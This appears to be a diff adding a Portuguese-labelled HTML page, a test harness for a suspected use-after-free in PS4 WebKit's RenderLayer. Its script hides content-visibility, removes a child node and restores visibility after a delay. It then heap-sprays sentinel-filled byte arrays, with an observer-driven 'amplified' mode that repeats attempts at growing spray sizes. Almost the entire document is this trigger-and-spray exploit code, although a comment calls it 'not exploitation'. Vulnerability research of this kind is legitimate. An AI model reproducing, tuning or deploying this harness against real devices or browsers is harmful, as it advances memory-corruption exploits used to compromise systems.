@@ -1,0 +1,408 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PS4 WebKit RenderLayer content-visibility UAF Harness (Controlled + Amplified)</title>
+</head>
+<body>
+  <h1>PS4 WebKit – RenderLayer content-visibility + remove() Harness</h1>
+
+  <p>
+    <b>Objetivo:</b> Executar tentativas controladas e amplificadas com logs claros:
+    tentativa, timing (ms), estado do DOM, e parâmetros do spray (tamanho/quantidade).
+  </p>
+
+  <hr>
+
+  <h2>DOM alvo</h2>
+  <div class="container" style="width: 220px; height: 220px; border: 1px solid #444; position: relative;">
+    <div class="child" style="width: 80px; height: 80px; background: #00f; position: absolute; top: 20px; left: 20px;"></div>
+  </div>
+
+  <p>
+    <button id="btnReset">Reset DOM</button>
+  </p>
+
+  <hr>
+
+  <h2>Modo Controlado (sem observer)</h2>
+  <p>
+    <button id="btnRunOnce">Run once</button>
+    <label style="margin-left: 12px;">
+      Delay (ms):
+      <input id="inpDelay" type="number" value="0" min="0" max="1000" step="1" style="width: 90px;">
+    </label>
+  </p>
+
+  <hr>
+
+  <h2>Modo Amplificador (observer com trava)</h2>
+  <p>
+    <button id="btnStartAmp">Start Amplified</button>
+    <button id="btnStopAmp">Stop</button>
+
+    <label style="margin-left: 12px;">
+      Max tentativas:
+      <input id="inpMaxAttempts" type="number" value="20" min="1" max="200" step="1" style="width: 90px;">
+    </label>
+
+    <label style="margin-left: 12px;">
+      Auto-delay (ms):
+      <input id="inpAmpDelay" type="number" value="0" min="0" max="1000" step="1" style="width: 90px;">
+    </label>
+  </p>
+
+  <hr>
+
+  <h2>Parâmetros do Spray (parametrizado e escalonado)</h2>
+  <p>
+    <label>
+      Chunk size (bytes) inicial:
+      <input id="inpChunkSize" type="number" value="4096" min="256" max="65536" step="256" style="width: 110px;">
+    </label>
+
+    <label style="margin-left: 12px;">
+      Chunks inicial:
+      <input id="inpChunks" type="number" value="1500" min="0" max="20000" step="50" style="width: 110px;">
+    </label>
+
+    <label style="margin-left: 12px;">
+      Step (aumentar chunks por tentativa):
+      <input id="inpStep" type="number" value="250" min="0" max="5000" step="50" style="width: 110px;">
+    </label>
+
+    <label style="margin-left: 12px;">
+      Max chunks:
+      <input id="inpMaxChunks" type="number" value="8000" min="0" max="30000" step="100" style="width: 110px;">
+    </label>
+  </p>
+
+  <p>
+    <label>
+      Preencher bytes (touch heap):
+      <input id="chkFill" type="checkbox" checked>
+    </label>
+
+    <label style="margin-left: 12px;">
+      Sentinela:
+      <input id="inpSentinel" type="text" value="0x41" style="width: 80px;">
+    </label>
+  </p>
+
+  <hr>
+
+  <h2>Log</h2>
+  <p>
+    <button id="btnClear">Clear log</button>
+  </p>
+  <pre id="log" style="white-space: pre-wrap; border: 1px solid #333; padding: 10px; min-height: 240px;"></pre>
+
+<script>
+(() => {
+  const $ = (id) => document.getElementById(id);
+  const logEl = $("log");
+
+  function nowMs() { return (typeof performance !== "undefined" && performance.now) ? performance.now() : Date.now(); }
+  function log(line) { logEl.textContent += line + "\n"; }
+  function hr() { log("------------------------------------------------------------"); }
+
+  // DOM references resolved dynamically to avoid null-on-load issues.
+  function getDOM() {
+    return {
+      container: document.querySelector(".container"),
+      child: document.querySelector(".child")
+    };
+  }
+
+  function domState() {
+    const { container, child } = getDOM();
+    return {
+      containerExists: !!container,
+      childExists: !!child,
+      childInDOM: !!(child && child.isConnected),
+      containerCV: container ? String(container.style.contentVisibility || "(empty)") : "(no container)"
+    };
+  }
+
+  function parseSentinel(s) {
+    // Accept "0x41" or "65"
+    try {
+      if (typeof s !== "string") return 0x41;
+      s = s.trim().toLowerCase();
+      if (s.startsWith("0x")) return Math.max(0, Math.min(255, parseInt(s, 16) | 0));
+      return Math.max(0, Math.min(255, parseInt(s, 10) | 0));
+    } catch (_) {
+      return 0x41;
+    }
+  }
+
+  // Heap spray returns references to prevent immediate GC
+  function heapSpray({ chunkSize, chunks, fill, sentinelByte }) {
+    const arr = new Array(chunks);
+    for (let i = 0; i < chunks; i++) {
+      const u8 = new Uint8Array(chunkSize);
+      if (fill) {
+        u8.fill(sentinelByte);
+      }
+      arr[i] = u8;
+    }
+    return arr;
+  }
+
+  // Global harness state
+  const state = {
+    attempt: 0,
+    running: false,
+    ampEnabled: false,
+    ampMaxAttempts: 20,
+    ampObserver: null,
+    lastSpray: null,
+    stats: {
+      started: 0,
+      completed: 0,
+      jsErrors: 0
+    }
+  };
+
+  function readSprayConfig() {
+    const chunkSize = Math.max(256, Math.min(65536, parseInt($("inpChunkSize").value, 10) || 4096));
+    const chunks0 = Math.max(0, Math.min(30000, parseInt($("inpChunks").value, 10) || 0));
+    const step = Math.max(0, Math.min(5000, parseInt($("inpStep").value, 10) || 0));
+    const maxChunks = Math.max(0, Math.min(30000, parseInt($("inpMaxChunks").value, 10) || chunks0));
+    const fill = !!$("chkFill").checked;
+    const sentinelByte = parseSentinel($("inpSentinel").value);
+
+    return { chunkSize, chunks0, step, maxChunks, fill, sentinelByte };
+  }
+
+  function computeChunksForAttempt(attemptIndex) {
+    // attemptIndex starts at 1
+    const cfg = readSprayConfig();
+    const raw = cfg.chunks0 + (attemptIndex - 1) * cfg.step;
+    const chunks = Math.min(cfg.maxChunks, Math.max(0, raw));
+    return { ...cfg, chunks };
+  }
+
+  function printHeader(kind, attemptIndex, delayMs, sprayCfg) {
+    const t = new Date();
+    const ds = domState();
+    log(`[${t.toISOString()}] ${kind} attempt #${attemptIndex}`);
+    log(`  delayMs=${delayMs}`);
+    log(`  DOM: container=${ds.containerExists} childExists=${ds.childExists} childInDOM=${ds.childInDOM} container.contentVisibility=${ds.containerCV}`);
+    log(`  spray: chunkSize=${sprayCfg.chunkSize} chunks=${sprayCfg.chunks} fill=${sprayCfg.fill} sentinelByte=0x${sprayCfg.sentinelByte.toString(16)}`);
+  }
+
+  function classifyDOMAfter() {
+    const ds = domState();
+    log(`  POST DOM: childInDOM=${ds.childInDOM} container.contentVisibility=${ds.containerCV}`);
+  }
+
+  function safeSetContentVisibility(container, value) {
+    try { container.style.contentVisibility = value; return true; } catch (_) { return false; }
+  }
+
+  function runAttempt({ kind, delayMs }) {
+    if (state.running) {
+      log(`[WARN] Ignored: already running.`);
+      return;
+    }
+
+    const { container, child } = getDOM();
+    if (!container) {
+      log(`[ERROR] No .container found. Use "Reset DOM" first.`);
+      return;
+    }
+    if (!child) {
+      log(`[WARN] No .child found (already removed). Use "Reset DOM" first.`);
+      return;
+    }
+
+    state.running = true;
+    state.attempt += 1;
+
+    const attemptIndex = state.attempt;
+    const sprayCfg = computeChunksForAttempt(attemptIndex);
+
+    state.stats.started += 1;
+    const t0 = nowMs();
+
+    printHeader(kind, attemptIndex, delayMs, sprayCfg);
+
+    // Step 1: content-visibility hidden
+    const ok1 = safeSetContentVisibility(container, "hidden");
+    log(`  step1: set content-visibility:hidden => ${ok1}`);
+
+    // Step 2: remove child
+    let ok2 = false;
+    try {
+      child.remove();
+      ok2 = true;
+    } catch (e) {
+      ok2 = false;
+      log(`  step2: child.remove() EXCEPTION => ${String(e)}`);
+    }
+    log(`  step2: child.remove() => ${ok2}`);
+
+    // Step 3: restore content-visibility after delay, then spray
+    setTimeout(() => {
+      const t1 = nowMs();
+      let ok3 = safeSetContentVisibility(container, "auto");
+      log(`  step3: set content-visibility:auto => ${ok3}`);
+
+      // Optional "pipeline marker": layout read
+      // This is not exploitation; it helps classify scheduling sensitivity.
+      let rect = null;
+      try {
+        rect = container.getBoundingClientRect();
+        log(`  marker: getBoundingClientRect => w=${Math.round(rect.width)} h=${Math.round(rect.height)}`);
+      } catch (e) {
+        log(`  marker: getBoundingClientRect EXCEPTION => ${String(e)}`);
+      }
+
+      // Step 4: heap spray (parametrized/scaled)
+      let ok4 = true;
+      try {
+        state.lastSpray = heapSpray(sprayCfg);
+      } catch (e) {
+        ok4 = false;
+        state.stats.jsErrors += 1;
+        log(`  step4: heapSpray EXCEPTION => ${String(e)}`);
+      }
+      log(`  step4: heapSpray => ${ok4} (refs kept)`);
+
+      classifyDOMAfter();
+
+      const t2 = nowMs();
+      const dtTotal = (t2 - t0).toFixed(2);
+      const dtDelay = (t1 - t0).toFixed(2);
+      log(`  timing: to setTimeout callback=${dtDelay}ms; total=${dtTotal}ms`);
+
+      // Completion bookkeeping
+      state.stats.completed += 1;
+
+      // Print running stats
+      log(`  stats: started=${state.stats.started} completed=${state.stats.completed} jsErrors=${state.stats.jsErrors}`);
+      hr();
+
+      state.running = false;
+
+      // Amplified mode: if enabled, schedule next attempt through a mutation nudge.
+      if (state.ampEnabled) {
+        if (state.attempt >= state.ampMaxAttempts) {
+          log(`[AMP] Reached max attempts (${state.ampMaxAttempts}). Stopping.`);
+          stopAmplified();
+          return;
+        }
+
+        // Small, controlled DOM nudge to produce a mutation event.
+        // This encourages the observer path without infinite recursion.
+        try {
+          const n = document.createElement("div");
+          n.textContent = "n";
+          n.style.display = "none";
+          container.appendChild(n);
+          container.removeChild(n);
+        } catch (_) { /* ignore */ }
+      }
+    }, delayMs);
+  }
+
+  function resetDOM() {
+    const container = document.querySelector(".container");
+    if (!container) return;
+
+    // Remove existing child if present
+    const existing = container.querySelector(".child");
+    if (existing) existing.remove();
+
+    // Recreate child
+    const c = document.createElement("div");
+    c.className = "child";
+    c.style.width = "80px";
+    c.style.height = "80px";
+    c.style.background = "#00f";
+    c.style.position = "absolute";
+    c.style.top = "20px";
+    c.style.left = "20px";
+    container.appendChild(c);
+
+    // Reset content-visibility to empty/auto baseline
+    container.style.contentVisibility = "";
+    log(`[RESET] DOM restored: .child recreated; container.contentVisibility cleared.`);
+    hr();
+  }
+
+  function startAmplified() {
+    if (state.ampEnabled) {
+      log(`[AMP] Already enabled.`);
+      return;
+    }
+
+    // Configure cap
+    state.ampMaxAttempts = Math.max(1, Math.min(200, parseInt($("inpMaxAttempts").value, 10) || 20));
+
+    const { container } = getDOM();
+    if (!container) {
+      log(`[ERROR] No .container found. Use "Reset DOM" first.`);
+      return;
+    }
+
+    state.ampEnabled = true;
+
+    // Create observer with "running" lock and attempt cap.
+    state.ampObserver = new MutationObserver((mutList) => {
+      if (!state.ampEnabled) return;
+      if (state.running) return;
+      if (state.attempt >= state.ampMaxAttempts) return;
+
+      // Only trigger on meaningful childList mutations
+      let meaningful = false;
+      for (const m of mutList) {
+        if (m.type === "childList") { meaningful = true; break; }
+      }
+      if (!meaningful) return;
+
+      const delayMs = Math.max(0, Math.min(1000, parseInt($("inpAmpDelay").value, 10) || 0));
+      runAttempt({ kind: "AMPLIFIED", delayMs });
+    });
+
+    state.ampObserver.observe(container, { childList: true, subtree: true });
+
+    log(`[AMP] Enabled. Max attempts=${state.ampMaxAttempts}. Observer armed with running-lock.`);
+    hr();
+
+    // Kick off first attempt immediately (observer will continue from mutations we nudge).
+    const delayMs = Math.max(0, Math.min(1000, parseInt($("inpAmpDelay").value, 10) || 0));
+    runAttempt({ kind: "AMPLIFIED", delayMs });
+  }
+
+  function stopAmplified() {
+    state.ampEnabled = false;
+    if (state.ampObserver) {
+      try { state.ampObserver.disconnect(); } catch (_) {}
+      state.ampObserver = null;
+    }
+    log(`[AMP] Disabled.`);
+    hr();
+  }
+
+  // Wire UI
+  $("btnClear").addEventListener("click", () => { logEl.textContent = ""; });
+  $("btnReset").addEventListener("click", resetDOM);
+
+  $("btnRunOnce").addEventListener("click", () => {
+    const delayMs = Math.max(0, Math.min(1000, parseInt($("inpDelay").value, 10) || 0));
+    runAttempt({ kind: "CONTROLLED", delayMs });
+  });
+
+  $("btnStartAmp").addEventListener("click", startAmplified);
+  $("btnStopAmp").addEventListener("click", stopAmplified);
+
+  // Initial banner
+  log(`[INIT] Harness loaded. Use "Reset DOM" then "Run once" or "Start Amplified".`);
+  hr();
+})();
+</script>
+</body>
+</html>
